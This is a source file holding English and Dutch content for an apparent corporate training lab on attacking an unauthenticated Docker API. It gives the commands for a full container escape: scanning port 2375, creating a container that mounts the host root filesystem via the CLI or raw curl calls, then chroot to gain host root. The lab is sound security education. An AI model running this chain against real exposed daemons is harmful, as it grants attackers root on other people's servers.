import React from 'react';
import { AppContent } from './types';
import { DockerDiagram, NetworkScanDiagram, ExploitDiagram } from './components/Visuals';

// Hardcoded lab values for consistency
const LAB_VARS = {
  HOST_IP: "172.17.0.1",
  KALI_IP: "172.17.0.2",
  PORT: "2375"
};

export const CONTENT: Record<'en' | 'nl', AppContent> = {
  en: {
    header: {
      title: "Unsecured Docker API Attack Lab",
      subtitle: "Understanding Container Escape and Privilege Escalation",
      badge: "ING Factory • Docker Security Lab"
    },
    challenges: [
      {
        id: 0,
        title: "Understanding the Environment",
        difficulty: "BEGINNER",
        theory: {
          title: "The Virtual Environment",
          content: "We are using a **Dockerized** setup to demonstrate a critical misconfiguration. A system administrator has accidentally exposed the Docker API to the network without authentication. This allows anyone on the network to control the Docker daemon.",
          analogy: "Imagine the Docker API is the remote control for the entire building. The admin left it on a park bench outside (No Authentication), so anyone walking by can pick it up and unlock any door.",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "The Security Risk",
          description: "When Docker API is exposed without authentication, attackers can run any container, mount host files, and gain root access.",
          scenario: "Thousands of Docker hosts are compromised yearly due to exposed APIs. Attackers often deploy cryptocurrency miners or ransomware immediately upon discovery."
        },
        task: {
          title: "Connect to your Attack Machine",
          steps: [
            {
              label: "1. Connect to your Kali Linux container from your host terminal:",
              command: "docker exec -it kali bash",
              context: "Host Terminal"
            },
            {
              label: "2. Verify you are in the attack container:",
              command: "hostname",
              output: "attackmachine",
              context: "Kali Container"
            }
          ]
        },
        hints: [
          {
            title: "What is Docker?",
            type: "info",
            content: "Docker is a platform that uses OS-level virtualization to deliver software in packages called containers. Containers are isolated from each other and bundle their own software, libraries and configuration files."
          },
          {
            title: "Why is this Dangerous?",
            type: "ing",
            content: "Exposing the Docker API is equivalent to giving root access to your server. At ING, we use strict security policies and secure orchestration platforms to prevent this."
          }
        ]
      },
      {
        id: 1,
        title: "Discovering the Exposed API",
        difficulty: "BEGINNER",
        theory: {
          title: "Network Reconnaissance",
          content: "Before attacking, we must find the target. **Port Scanning** identifies open doors. Docker typically runs on port 2375 (unencrypted) or 2376 (TLS). Since this lab simulates a misconfiguration, we look for port 2375.",
          analogy: "We are using `nmap` to knock on the door of the host machine to see if the Docker manager answers.",
          visual: <NetworkScanDiagram />
        },
        realWorld: {
          title: "Discovery Methods",
          description: "Attackers use tools like Shodan or Masscan to scan the entire internet for port 2375.",
          scenario: "If an attacker finds port 2375 open, they can query the '/version' endpoint to confirm it's a Docker instance and start their attack."
        },
        task: {
          title: "Scan and Test Access",
          steps: [
            {
              label: "1. Scan the host for the Docker port:",
              command: `nmap -p ${LAB_VARS.PORT} ${LAB_VARS.HOST_IP}`,
              output: `PORT     STATE SERVICE\n${LAB_VARS.PORT}/tcp open  docker`,
              context: "Kali Container"
            },
            {
              label: "2. Test API access by requesting version info (using curl):",
              command: `curl http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/version`,
              output: `{\n  "Platform": {\n    "Name": "Docker Engine - Community"\n  },\n  "Version": "24.0.7",\n  ...\n}`,
              context: "Kali Container"
            }
          ]
        },
        hints: [
          {
            title: "API vs CLI",
            type: "command",
            content: "The `docker` command you use daily is actually just a client that talks to this API! Using `curl` allows us to talk directly to the engine, which is how exploits are often scripted."
          },
          {
            title: "Useful Endpoints",
            type: "info",
            content: "Try `/containers/json` to list containers or `/info` for system details. These endpoints give attackers a map of what's running."
          }
        ]
      },
      {
        id: 2,
        title: "Creating a Malicious Container",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "The Attack Strategy",
          content: "To escape to the host, we need to create a new container. The trick is to **mount the host's root filesystem** (`/`) into our container (e.g., at `/host`). This gives us access to every file on the physical server.",
          analogy: "It's like renting a hotel room (container) but convincing the front desk to give you a master key that opens the manager's office (host filesystem).",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "Weaponizing the API",
          description: "We will use the API to manually craft a container configuration that includes this dangerous mount.",
          scenario: "This is often the first step in a 'Container Escape' attack. Once the container is running with the host mounted, the isolation is effectively broken."
        },
        task: {
          title: "Craft and Launch Payload",
          steps: [
            {
              label: "1. Create and Start a container with host root mounted:",
              context: "Kali Container",
              tabs: [
                {
                  label: "Docker CLI (Recommended)",
                  command: `docker -H tcp://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT} run -d --name evil -v /:/host -it alpine sh`
                },
                {
                  label: "Raw API (Curl)",
                  command: `# 1. Create Container\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/create?name=evil \\\n  -H "Content-Type: application/json" \\\n  -d '{"Image": "alpine", "Cmd": ["sh"], "Tty": true, "HostConfig": { "Binds": ["/:/host"] }}'\n\n# 2. Start Container\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/evil/start`
                }
              ],
              output: `e90e34... (Container ID)`
            },
            {
              label: "2. Verify it is running:",
              context: "Kali Container",
              tabs: [
                {
                  label: "Docker CLI",
                  command: `docker -H tcp://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT} ps | grep evil`
                },
                {
                  label: "Raw API",
                  command: `curl http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/json | grep evil`
                }
              ]
            }
          ]
        },
        hints: [
          {
            title: "Docker CLI vs Raw API",
            type: "info",
            content: "The `docker` command is just a convenient wrapper that makes API calls for you. `docker run` is powerful because it combines both the 'create' and 'start' API endpoints into a single command. Hackers often use `curl` to script exploits precisely, but the CLI is faster for manual work."
          },
          {
            title: "The Critical Payload",
            type: "solution",
            content: "The dangerous part is `\"Binds\": [\"/:/host\"]` (or `-v /:/host`). This tells Docker: 'Take the entire main hard drive (`/`) and make it available inside the container at the folder `/host`'."
          }
        ]
      },
      {
        id: 3,
        title: "Escaping to Host Root",
        difficulty: "ADVANCED",
        theory: {
          title: "Privilege Escalation via Chroot",
          content: "Now that we have a container with the host files mounted, we enter it. We then use **chroot** (Change Root) to switch our session's root directory to `/host`. Effectively, we become root on the physical host machine, escaping the container completely.",
          analogy: "We are stepping out of the hotel room and declaring that the entire hotel is now our room.",
          visual: <ExploitDiagram />
        },
        realWorld: {
          title: "Total Compromise",
          description: "With root access on the host, we can read secrets, install backdoors, or wipe the system.",
          scenario: "We will demonstrate this by finding a secret flag file hidden on the host system that shouldn't be accessible to containers."
        },
        task: {
          title: "Execute the Escape",
          steps: [
            {
              label: "1. Exit Kali (return to Host) to access the new container:",
              command: "exit",
              context: "Kali Container"
            },
            {
              label: "2. Enter the 'evil' container we just created:",
              command: "docker exec -it evil sh",
              context: "Host Terminal"
            },
            {
              label: "3. Switch root to the host filesystem and find the flag:",
              command: "chroot /host bash\n\n# You are now Root on the Host!\ncat /root/.secret/flag.txt",
              output: "FLAG{D0ck3r_Pr1v3sc_Success!}",
              context: "Evil Container (Root)"
            }
          ]
        },
        hints: [
          {
            title: "Understanding chroot",
            type: "command",
            content: "`chroot /host` changes the apparent root directory. Since `/host` is the actual Host OS filesystem, running this makes your shell believe it is running on the Host OS directly."
          },
          {
            title: "Why does this work?",
            type: "info",
            content: "Docker containers (by default) run as root. When we mount the filesystem, we retain those root privileges on the mounted files."
          }
        ]
      }
    ],
    completion: {
      title: "Docker Security Lab Complete!",
      badge: "Container Security Master",
      learnedTitle: "What you've mastered:",
      learnedPoints: [
        "Discovering exposed Docker APIs (Port 2375)",
        "Interacting with the Docker Engine via raw HTTP",
        "Crafting malicious container payloads",
        "Escaping containers using Volume Mounts & Chroot"
      ],
      applyTitle: "Security Best Practices:",
      applyPoints: [
        "Never expose Docker API without TLS authentication",
        "Use a Docker socket proxy with limited permissions",
        "Run containers as non-root users",
        "Audit Docker configurations regularly"
      ]
    }
  },
  nl: {
    header: {
      title: "Onbeveiligd Docker API Aanvalslab",
      subtitle: "Container Escape en Privilege Escalation Begrijpen",
      badge: "ING Factory • Docker Security Lab"
    },
    challenges: [
      {
        id: 0,
        title: "De Omgeving Begrijpen",
        difficulty: "BEGINNER",
        theory: {
          title: "De Virtuele Omgeving",
          content: "We gebruiken een **Docker** setup om een kritieke misconfiguratie te demonstreren. Een systeembeheerder heeft per ongeluk de Docker API blootgesteld aan het netwerk zonder authenticatie.",
          analogy: "Stel je voor dat de Docker API de afstandsbediening is voor het hele gebouw. De beheerder liet het buiten liggen (geen authenticatie), zodat iedereen het kan oppakken en elke deur kan openen.",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "Het Veiligheidsrisico",
          description: "Wanneer de Docker API zonder authenticatie wordt blootgesteld, kunnen aanvallers elke container uitvoeren en root-toegang krijgen.",
          scenario: "Duizenden Docker-hosts worden jaarlijks gecompromitteerd. Aanvallers plaatsen vaak direct cryptominers."
        },
        task: {
          title: "Verbind met je Aanvalsmachine",
          steps: [
            {
              label: "1. Verbind met je Kali Linux container vanaf je host terminal:",
              command: "docker exec -it kali bash",
              context: "Host Terminal"
            },
            {
              label: "2. Verifieer dat je in de aanvalscontainer bent:",
              command: "hostname",
              output: "attackmachine",
              context: "Kali Container"
            }
          ]
        },
        hints: [
          {
            title: "Wat is Docker?",
            type: "info",
            content: "Docker is een platform dat virtualisatie gebruikt om software te leveren in containers. Containers zijn geïsoleerd van elkaar."
          },
          {
            title: "Waarom is dit gevaarlijk?",
            type: "ing",
            content: "Het blootstellen van de Docker API is gelijk aan het geven van root-toegang. Bij ING gebruiken we strikte beleidsregels om dit te voorkomen."
          }
        ]
      },
      {
        id: 1,
        title: "De Blootgestelde API Ontdekken",
        difficulty: "BEGINNER",
        theory: {
          title: "Netwerkverkenning",
          content: "Voor we aanvallen, moeten we het doelwit vinden. **Poortscannen** identificeert open deuren. Docker draait meestal op poort 2375 (onversleuteld). We zoeken specifiek naar deze poort.",
          analogy: "We gebruiken `nmap` om op de deur van de hostmachine te kloppen om te zien of de Docker-manager antwoordt.",
          visual: <NetworkScanDiagram />
        },
        realWorld: {
          title: "Ontdekkingsmethoden",
          description: "Aanvallers gebruiken tools zoals Shodan om het internet te scannen naar poort 2375.",
          scenario: "Als een aanvaller poort 2375 open vindt, kunnen ze de '/version' endpoint bevragen om de aanval te starten."
        },
        task: {
          title: "Scan en Test Toegang",
          steps: [
            {
              label: "1. Scan de host voor de Docker poort:",
              command: `nmap -p ${LAB_VARS.PORT} ${LAB_VARS.HOST_IP}`,
              output: `PORT     STATE SERVICE\n${LAB_VARS.PORT}/tcp open  docker`,
              context: "Kali Container"
            },
            {
              label: "2. Test API toegang door versie-info op te vragen (met curl):",
              command: `curl http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/version`,
              output: `{\n  "Platform": {\n    "Name": "Docker Engine - Community"\n  },\n  "Version": "24.0.7",\n  ...\n}`,
              context: "Kali Container"
            }
          ]
        },
        hints: [
          {
            title: "API vs CLI",
            type: "command",
            content: "Het `docker` commando is eigenlijk een client die met deze API praat! Gebruik van `curl` stelt ons in staat direct met de engine te praten."
          },
          {
            title: "Nuttige Endpoints",
            type: "info",
            content: "Probeer `/containers/json` om containers te lijsten. Dit geeft aanvallers een kaart van wat er draait."
          }
        ]
      },
      {
        id: 2,
        title: "Een Kwaadaardige Container Maken",
        difficulty: "INTERMEDIATE",
        theory: {
          title: "De Aanvalsstrategie",
          content: "Om naar de host te ontsnappen, maken we een nieuwe container. De truc is om **het root-bestandssysteem van de host** (`/`) in onze container te koppelen (bijv. op `/host`).",
          analogy: "Het is als een hotelkamer huren maar de receptie overtuigen om je de moedersleutel te geven die het kantoor van de manager opent.",
          visual: <DockerDiagram />
        },
        realWorld: {
          title: "De API Wapeniseren",
          description: "We gebruiken de API om handmatig een containerconfiguratie te maken met deze gevaarlijke koppeling.",
          scenario: "Dit is vaak de eerste stap in een 'Container Escape' aanval. Zodra de container draait met de host gekoppeld, is de isolatie verbroken."
        },
        task: {
          title: "Payload Maken en Starten",
          steps: [
            {
              label: "1. Maak en Start een container met host root gekoppeld:",
              context: "Kali Container",
              tabs: [
                {
                  label: "Docker CLI (Aanbevolen)",
                  command: `docker -H tcp://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT} run -d --name evil -v /:/host -it alpine sh`
                },
                {
                  label: "Raw API (Curl)",
                  command: `# 1. Container Maken\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/create?name=evil \\\n  -H "Content-Type: application/json" \\\n  -d '{"Image": "alpine", "Cmd": ["sh"], "Tty": true, "HostConfig": { "Binds": ["/:/host"] }}'\n\n# 2. Container Starten\ncurl -X POST http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/evil/start`
                }
              ],
              output: `e90e34... (Container ID)`
            },
            {
              label: "2. Verifieer dat hij draait:",
              context: "Kali Container",
              tabs: [
                {
                  label: "Docker CLI",
                  command: `docker -H tcp://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT} ps | grep evil`
                },
                {
                  label: "Raw API",
                  command: `curl http://${LAB_VARS.HOST_IP}:${LAB_VARS.PORT}/containers/json | grep evil`
                }
              ]
            }
          ]
        },
        hints: [
          {
            title: "Docker CLI vs Raw API",
            type: "info",
            content: "Het `docker`-commando is slechts een handige wrapper die API-aanroepen voor je doet. `docker run` is krachtig omdat het zowel de 'create' als 'start' endpoints combineert in één commando. Hackers gebruiken vaak `curl` om exploits nauwkeurig te scripten, maar de CLI is sneller voor handwerk."
          },
          {
            title: "De Kritieke Payload",
            type: "solution",
            content: "Het gevaarlijke deel is `\"Binds\": [\"/:/host\"]` (of `-v /:/host`). Dit vertelt Docker: 'Neem de hele harde schijf (`/`) en maak deze beschikbaar in de container op `/host`'."
          }
        ]
      },
      {
        id: 3,
        title: "Ontsnappen naar Host Root",
        difficulty: "ADVANCED",
        theory: {
          title: "Privilege Escalation via Chroot",
          content: "Nu we een container hebben met de hostbestanden, gaan we erin. We gebruiken **chroot** om onze rootmap te wijzigen naar `/host`. Effectief worden we root op de fysieke hostmachine.",
          analogy: "We stappen uit de hotelkamer en verklaren dat het hele hotel nu onze kamer is.",
          visual: <ExploitDiagram />
        },
        realWorld: {
          title: "Totale Compromittering",
          description: "Met root-toegang op de host kunnen we geheimen lezen, achterdeurtjes installeren of het systeem wissen.",
          scenario: "We demonstreren dit door een geheime vlag te vinden die verborgen is op het hostsysteem."
        },
        task: {
          title: "Voer de Ontsnapping Uit",
          steps: [
            {
              label: "1. Verlaat Kali (terug naar Host) om de nieuwe container te openen:",
              command: "exit",
              context: "Kali Container"
            },
            {
              label: "2. Ga de 'evil' container binnen die we net hebben gemaakt:",
              command: "docker exec -it evil sh",
              context: "Host Terminal"
            },
            {
              label: "3. Schakel root naar het host-bestandssysteem en vind de vlag:",
              command: "chroot /host bash\n\n# Je bent nu Root op de Host!\ncat /root/.secret/flag.txt",
              output: "FLAG{D0ck3r_Pr1v3sc_Success!}",
              context: "Evil Container (Root)"
            }
          ]
        },
        hints: [
          {
            title: "Chroot Begrijpen",
            type: "command",
            content: "`chroot /host` verandert de schijnbare rootmap. Omdat `/host` het echte Host OS-bestandssysteem is, laat dit je shell geloven dat het direct op het Host OS draait."
          },
          {
            title: "Waarom werkt dit?",
            type: "info",
            content: "Docker containers draaien (standaard) als root. Wanneer we het bestandssysteem koppelen, behouden we die root-rechten op de gekoppelde bestanden."
          }
        ]
      }
    ],
    completion: {
      title: "Docker Security Lab Voltooid!",
      badge: "Container Security Master",
      learnedTitle: "Wat je hebt geleerd:",
      learnedPoints: [
        "Blootgestelde Docker API's ontdekken (Poort 2375)",
        "Interactie met de Docker Engine via ruwe HTTP",
        "Kwaadaardige container payloads maken",
        "Ontsnappen uit containers met Volume Mounts & Chroot"
      ],
      applyTitle: "Beveiligings Best Practices:",
      applyPoints: [
        "Stel Docker API nooit bloot zonder TLS-authenticatie",
        "Gebruik een Docker socket proxy met beperkte rechten",
        "Draai containers als niet-root gebruikers",
        "Audit Docker-configuraties regelmatig"
      ]
    }
  }
};